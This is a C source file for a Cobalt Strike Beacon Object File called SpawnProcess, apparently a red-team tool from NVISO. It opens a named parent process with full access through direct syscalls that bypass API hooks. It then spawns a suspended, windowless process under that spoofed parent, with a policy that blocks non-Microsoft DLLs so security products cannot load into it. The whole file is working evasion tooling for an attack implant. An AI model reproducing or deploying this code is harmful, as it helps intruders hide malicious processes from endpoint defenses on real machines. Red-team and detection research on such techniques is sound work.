////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      SPAWNPROCESS BOF                                                                                              //
//                                                                                                                    //
//      POWERED BY: CobaltWhispers, SysWhispers2, InlineWhispers2                                                     //
//      AUTHOR: @Cerbersec                                                                                            //
//      PROPERTY OF: @NVISOsecurity                                                                                   //
//                                                                                                                    //
//      COMPILE WITH: gcc -o SpawnProcess.o -c SpawnProcess.c -masm=intel                                             //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <TlHelp32.h>
#include "beacon.h"
#include "syscalls.c"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                      IMPORTS                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$InitializeProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$UpdateProcThreadAttribute(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
DECLSPEC_IMPORT WINBASEAPI void WINAPI KERNEL32$DeleteProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT int MSVCRT$_stricmp(const char*, const char*);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void*, int, size_t);

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                    PROC SPAWN                                                      //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

HANDLE GetParentHandle(char* parent)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if(KERNEL32$Process32First(snapshot, &entry) == TRUE)
    {
        while(KERNEL32$Process32Next(snapshot, &entry) == TRUE)
        {
            if(MSVCRT$_stricmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                if(hProcess != INVALID_HANDLE_VALUE)
                {
                    NtClose(snapshot);
                    return hProcess;
                }
                else
                {
                    BeaconPrintf(CALLBACK_ERROR, "Could not find parent process");
                    NtClose(snapshot);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    NtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}

DWORD SpawnX64Proc(char* procPath, HANDLE parentHandle)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;

    MSVCRT$memset(&si, 0, sizeof(si));
    MSVCRT$memset(&pi, 0, sizeof(pi));

    KERNEL32$InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, attributeSize);
    KERNEL32$InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    KERNEL32$UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    KERNEL32$UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle, sizeof(HANDLE), NULL, NULL);

    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    if(!KERNEL32$CreateProcessA(procPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi))
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not spawn process");
        return 0;
    }

    KERNEL32$DeleteProcThreadAttributeList(si.lpAttributeList);
    NtClose(parentHandle);

    return pi.dwProcessId;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                         MAIN                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    char *procPath = BeaconDataExtract(&parser, NULL);
    char *parent = BeaconDataExtract(&parser, NULL);

    HANDLE hProcess = GetParentHandle(parent);
    if(hProcess == INVALID_HANDLE_VALUE)
        return;
    DWORD pid = SpawnX64Proc(procPath, hProcess);

    if (pid) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawned new process with PID: %ld", pid);
    }
}